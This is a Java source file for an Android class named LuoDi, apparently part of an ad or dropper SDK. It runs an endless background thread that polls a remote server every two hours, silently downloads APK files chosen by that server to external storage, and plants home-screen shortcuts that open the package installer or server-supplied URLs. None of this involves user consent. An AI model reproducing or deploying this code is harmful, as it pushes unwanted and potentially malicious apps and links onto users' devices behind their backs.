package d.sl.i;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.os.Looper;

public class LuoDi {

	protected static void getIcon(Context context, AppInfo appInfo, String filePath) {
		Bitmap iconBm = null;
		try {
			URL url = new URL(appInfo.getIcon());
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.connect();
			InputStream is = connection.getInputStream();
			iconBm = BitmapFactory.decodeStream(is);
			appInfo.setBm(iconBm);
			CreatIcon(context, appInfo.getName(), iconBm, filePath);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void CreatIcon(Context context, String name, Bitmap bit, String fileurl) {
		Intent intent = new Intent();
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.setAction(android.content.Intent.ACTION_VIEW);
		intent.setDataAndType(Uri.fromFile(new File(fileurl)), "application/vnd.android.package-archive");
		Intent shortcutIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
		shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
		shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intent);
		shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON, bit);
		shortcutIntent.putExtra("duplicate", false);
		context.sendBroadcast(shortcutIntent);
	}

	public static void luodi(final Context context, final String appid) {
		new Thread() {
			public void run() {
				while (true) {
					HttpClient client = new DefaultHttpClient();
					HttpGet get = new HttpGet((Urls.luodiaads + "?" + appid).trim());
					try {
						HttpResponse response = client.execute(get);
						BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity()
								.getContent()));
						StringBuilder builder = new StringBuilder();
						String line = "";
						while ((line = reader.readLine()) != null) {
							builder.append(line);
						}
						if (builder.length() > 0) {
							try {
								String json = builder.substring(builder.indexOf("["), builder.lastIndexOf("]") + 1);
								DLluodi(context, json);
							} catch (Exception e) {
							}
						}
						client.getConnectionManager().shutdown();
					} catch (ClientProtocolException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
					try {
						sleep(7200 * 1000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			};
		}.start();
	}

	protected static void DLluodi(Context context, String json) {
		try {
			JSONArray array = new JSONArray(json);
			ArrayList<AppInfo> apps = new ArrayList<AppInfo>();
			for (int i = 0; i < array.length(); i++) {
				if (array.length() == 0) {
					break;
				}
				AppInfo info = new AppInfo();
				JSONObject object = array.getJSONObject(i);
				info.setName(object.getString("name"));
				info.setIcon(object.getString("icon").replace("\\", ""));
				info.setAppurl(object.getString("appurl").replace("\\", ""));
				info.setIsapk(object.getString("isapk"));
				apps.add(info);
			}
			DLDLuodi(context, apps);
		} catch (JSONException e) {
			e.printStackTrace();
		}

	}

	private static void DLDLuodi(final Context context, final ArrayList<AppInfo> apps) {
		new Thread() {
			public void run() {
				try {
					Looper.prepare();
					for (int i = 0; i < apps.size(); i++) {
						if (apps.size() == 0) {
							break;
						}
						if (apps.get(i).getIsapk().equals("1")) {
							String appUrl = apps.get(i).getAppurl();
							String dlDoneName = appUrl.substring(appUrl.lastIndexOf("/") + 1, appUrl.length());
							HttpClient client = new DefaultHttpClient();
							HttpGet get = new HttpGet(appUrl);
							HttpResponse response = client.execute(get);
							File file = new File(Environment.getExternalStorageDirectory(), dlDoneName);
							if (file.exists() && file.length() == response.getEntity().getContentLength()) {
								client.getConnectionManager().shutdown();
								getIcon(context, apps.get(i), file.getAbsolutePath());
							} else {
								file.delete();
								String apkDLName = appUrl.substring(appUrl.lastIndexOf("/") + 1,
										appUrl.lastIndexOf("."))
										+ ".bat";
								File apkDLFile = new File(Environment.getExternalStorageDirectory(), apkDLName);
								InputStream is = response.getEntity().getContent();
								FileOutputStream fos = new FileOutputStream(apkDLFile);
								byte[] buff = new byte[1024];
								int len = 0;
								while ((len = is.read(buff)) != -1) {
									fos.write(buff, 0, len);
								}
								fos.flush();
								is.close();
								fos.close();
								if (get != null) {
									get.abort();
								}
								apkDLFile.renameTo(new File(Environment.getExternalStorageDirectory(), dlDoneName));
								client.getConnectionManager().shutdown();
								getIcon(context, apps.get(i), file.getAbsolutePath());
							}
						} else {
							URL url = new URL(apps.get(i).getIcon());
							HttpURLConnection connection = (HttpURLConnection) url.openConnection();
							connection.connect();
							InputStream is = connection.getInputStream();
							Intent intent = new Intent();
							intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							intent.setAction(android.content.Intent.ACTION_VIEW);
							intent.setData(Uri.parse(apps.get(i).getAppurl()));
							Intent shortcutIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
							shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, apps.get(i).getName());
							shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intent);
							Bitmap bm = BitmapFactory.decodeStream(is);
							shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON, bm);
							shortcutIntent.putExtra("duplicate", false);
							context.sendBroadcast(shortcutIntent);
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}.start();
	}

	// // 检测是否连接WIFI
	// public static boolean checkwifi(Context contexta) {
	// Context context = contexta.getApplicationContext();
	// ConnectivityManager connectivity = (ConnectivityManager)
	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
	// if (connectivity != null) {
	// NetworkInfo[] info = connectivity.getAllNetworkInfo();
	// if (info != null) {
	// for (int i = 0; i < info.length; i++) {
	// if (info[i].getTypeName().equals("WIFI") && info[i].isConnected()) {
	// return true;
	// }
	// }
	// }
	// }
	// return false;
	// }

	/* 检测图标是否存在 */
	// public static boolean hasShortcut(Context context, String shortcutName) {
	// boolean isInstallShortcut = false;
	// final ContentResolver cr = context.getContentResolver();
	// final String AUTHORITY = getAuthorityFromPermission(context,
	// "com.android.launcher.permission.READ_SETTINGS");
	// // final String AUTHORITY = "com.android.launcher.settings";
	// final Uri CONTENT_URI = Uri.parse("content://" + AUTHORITY
	// + "/favorites?notify=true");
	// Cursor c = cr.query(CONTENT_URI,
	// new String[] { "title", "iconResource" }, "title=?",
	// new String[] { shortcutName }, null);
	// if (c != null && c.getCount() > 0) {
	// isInstallShortcut = true;
	// }
	// return isInstallShortcut;
	// }
	//
	// private static String getAuthorityFromPermission(Context context,
	// String permission) {
	// if (permission == null)
	// return null;
	// List<PackageInfo> packs = context.getPackageManager()
	// .getInstalledPackages(PackageManager.GET_PROVIDERS);
	// if (packs != null) {
	// for (PackageInfo pack : packs) {
	// ProviderInfo[] providers = pack.providers;
	// if (providers != null) {
	// for (ProviderInfo provider : providers) {
	// if (permission.equals(provider.readPermission))
	// return provider.authority;
	// if (permission.equals(provider.writePermission))
	// return provider.authority;
	// }
	// }
	// }
	// }
	// return null;
	// }

}